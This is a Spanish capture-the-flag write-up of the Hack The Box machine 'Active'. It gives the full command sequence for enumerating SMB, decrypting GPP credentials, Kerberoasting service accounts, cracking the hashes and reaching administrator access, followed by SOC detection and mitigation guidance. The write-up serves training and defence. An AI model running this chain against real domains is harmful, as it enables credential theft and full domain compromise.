# HTB - Active (Active Directory / Kerberoasting)

---

## Recopilación de información

<aside>
💡

### Fase de enumeración

Se inicia el reconocimiento identificando la máquina objetivo dentro de la red. Tras localizar la IP, se realiza un escaneo completo de puertos para identificar servicios expuestos.

El escaneo revela múltiples servicios característicos de un entorno **Active Directory**, incluyendo:

* **88 (Kerberos)**
* **135 (RPC)**
* **139 / 445 (SMB)**
* **389 (LDAP)**

La presencia de estos servicios indica que la máquina forma parte de un dominio Windows.

</aside>

---

### Comandos de enumeración

```bash id="enum01"
sudo nmap -p- -sS --min-rate 5000 -n -Pn IP -oN puertos.txt
```

```bash id="enum02"
sudo nmap -p88,135,139,389,445 -sCV IP -oN servicios.txt
```

---

## Enumeración SMB

<aside>
💡

Se accede al servicio SMB sin autenticación, lo que permite listar recursos compartidos del sistema.

</aside>

```bash id="smb01"
smbclient -L //IP -N
```

Se identifica un recurso compartido accesible:

```text id="smb02"
Replication
```

---

### Análisis del recurso compartido

```bash id="smb03"
smbclient //IP/Replication -N
```

Se descarga el contenido:

```bash id="smb04"
get Groups.xml
```

---

## Obtención de credenciales

<aside>
💡

El archivo `Groups.xml` contiene credenciales en formato cifrado mediante GPP (Group Policy Preferences).

Estas credenciales pueden ser descifradas fácilmente, ya que la clave es pública.

</aside>

```bash id="cred01"
gpp-decrypt <cpassword>
```

Se obtienen credenciales válidas de dominio.

---

## Acceso inicial

```bash id="access01"
evil-winrm -i IP -u usuario -p contraseña
```

Se obtiene acceso al sistema como usuario del dominio.

---

## Escalada de privilegios (Kerberoasting)

<aside>
💡

Se realiza enumeración de cuentas con SPN (Service Principal Names), lo que permite identificar cuentas susceptibles de ataque Kerberoasting.

</aside>

```bash id="priv01"
GetUserSPNs.py dominio/usuario:password -dc-ip IP
```

Se extraen hashes Kerberos.

---

### Crackeo de hashes

```bash id="priv02"
hashcat -m 13100 hash.txt rockyou.txt
```

Se obtiene la contraseña de una cuenta con privilegios elevados.

---

## Acceso como administrador

```bash id="priv03"
evil-winrm -i IP -u administrador -p contraseña
```

Resultado:

```text id="priv04"
NT AUTHORITY\SYSTEM
```

---

## Análisis del ataque (ofensivo)

Cadena de ataque:

1. Enumeración de servicios AD
2. Acceso a recurso SMB sin autenticación
3. Extracción de credenciales (GPP)
4. Acceso inicial al sistema
5. Enumeración de SPN
6. Ataque Kerberoasting
7. Escalada de privilegios

---

## Enfoque SOC (detección)

<aside>
💡

Este ataque es representativo de compromisos reales en entornos Active Directory.

</aside>

### Indicadores de compromiso (IoC)

* Accesos anónimos a recursos SMB
* Lectura de archivos sensibles (Groups.xml)
* Solicitudes anómalas de tickets Kerberos
* Uso intensivo de SPN enumeration
* Actividad de autenticación inusual

---

### Logs relevantes

* **Windows Security Logs**

  * 4624 (logon)
  * 4769 (Kerberos ticket request)
* **SMB logs**
* **Domain Controller logs**
* **SIEM correlación de eventos AD**

---

### Detección en entorno real

* Alertas por acceso a GPP
* Detección de Kerberoasting (event ID 4769)
* Monitorización de acceso a recursos compartidos
* Análisis de comportamiento de cuentas de servicio

---

## Enfoque SOC (mitigación y prevención)

<aside>
💡

El ataque se basa en malas prácticas de configuración en Active Directory.

</aside>

### Medidas técnicas

* Eliminar uso de **GPP para credenciales**
* Usar contraseñas fuertes en cuentas de servicio
* Limitar permisos en recursos SMB
* Implementar **Least Privilege**
* Rotación de credenciales

---

### Medidas de detección

* SIEM con alertas de Kerberoasting
* Monitorización de tickets Kerberos
* EDR para detectar uso de herramientas ofensivas

---

### Medidas organizativas

* Auditorías de Active Directory
* Revisión de políticas de seguridad
* Hardening de dominio

---

## Impacto real

<aside>
💡

Este tipo de ataque permite:

* Compromiso de dominio
* Escalada a administrador
* Movimiento lateral
* Persistencia en red corporativa

</aside>

---

## Conclusión

<aside>
💡

Este laboratorio demuestra cómo una mala configuración en Active Directory puede derivar en un compromiso total del dominio.

A diferencia de ataques simples, aquí no se explota una vulnerabilidad técnica directa, sino errores de configuración y gestión de credenciales.

Desde una perspectiva SOC, este ataque es detectable mediante:

* Monitorización de eventos Kerberos
* Correlación de accesos SMB
* Análisis de comportamiento de cuentas

</aside>

---
